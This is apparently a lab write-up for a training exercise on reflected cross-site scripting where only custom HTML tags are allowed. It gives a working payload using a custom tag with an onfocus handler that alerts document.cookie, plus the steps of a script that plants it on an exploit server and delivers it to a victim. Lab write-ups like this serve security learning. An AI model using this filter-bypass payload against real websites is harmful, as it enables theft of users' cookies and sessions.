### Lab: Reflected XSS into HTML context with all tags blocked except custom ones

This lab blocks all HTML tags except custom ones.

To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts _document.cookie_.

_____

Analysis and Exploit:

1. Try to send ```<img>``` tag returns the message error "Tag is not allowed"
    - send request to **[BURP-REPEATER]**

2. Repeat via **[BURP-REPEATER]** using tag ```xss```
    - /?search=%3Cxss%3EHERE%3C%2Fxss%3E
    - ```<xss>HERE</xss>``` is in the response

3. Store the following payload onto the exploit server and have it delivered to the victim ```<script>location = '[url1]/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';</script>```
    - Create a custom ID
    - Set condition to trigger 'alert(document.cookie)' when the id x gets focus
    - Get focus for id x calling **#x**

_____

Script:

1. Take two URLs
    - if the number of arguments is != (self, arg1, arg2), print usage instructions

2. Store payload onto the exploit server (arg2) | POST **/** | params: urlIsHttps, reponseFile, responseHead, responseBody, formAction
    - urlisHttps: on
    - responseFile: /xss
    - responseHead: 'HTTP/1.1 200 OK Content-Type: text/html; charset=utf-8'
    - responseBody: payload
    - formAction: STORE

payload = ```<script>location = '[url1]/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';</script>```

3. Deliver payload to the victim | GET **/deliver-to-victim**

4. Check if exploit was successful | GET (url1) **/**
    - if "Congratulations, you solved the lab!" in response: exploit worked!

